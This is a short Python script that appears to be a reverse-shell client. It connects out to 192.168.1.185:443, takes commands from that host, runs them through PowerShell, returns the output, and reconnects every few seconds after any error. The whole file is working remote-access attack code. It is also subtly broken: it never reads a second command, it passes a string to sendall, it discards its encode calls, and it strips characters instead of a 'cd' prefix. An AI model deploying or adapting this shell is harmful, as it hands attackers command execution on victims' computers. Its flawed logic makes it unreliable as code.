import socket 
import subprocess
import os 
import time 
end_result = "<end-of-result>"

server_ip = "192.168.1.185"
server_port = 443

server_addr  =(server_ip,server_port)

while True :
    try :
        client_socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        client_socket.connect(server_addr) 
        server_command = client_socket.recv(1024)
        while True :
            command = server_command.decode() 
            if command == "q":
                client_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd") :
                new_path = command.strip("cd ")
                if os.path.exists(new_path) :
                    os.chdir(new_path)
                    continue
                else :
                    continue
            elif len(command) == 2 and command[0].isalpha() and command[1] == ":" :
                if os.path.exists(command):
                    os.chdir(command)
                    continue
                else :
                    continue
            else :
                output = subprocess.run (["powershell.exe",command],shell =True,capture_output=True)
                if output.stderr.decode("utf-8") == "":
                    result = output.stdout 
                    result = result.decode("utf-8") + end_result
                    result.encode("utf-8")
                elif  output.stderr.decode("utf-8") != "" :
                    result = output.stderr
                    result = result.decode("utf-8") + end_result
                    result.encode("utf-8")
                client_socket.sendall(result)
        
    except Exception :
        time.sleep(3)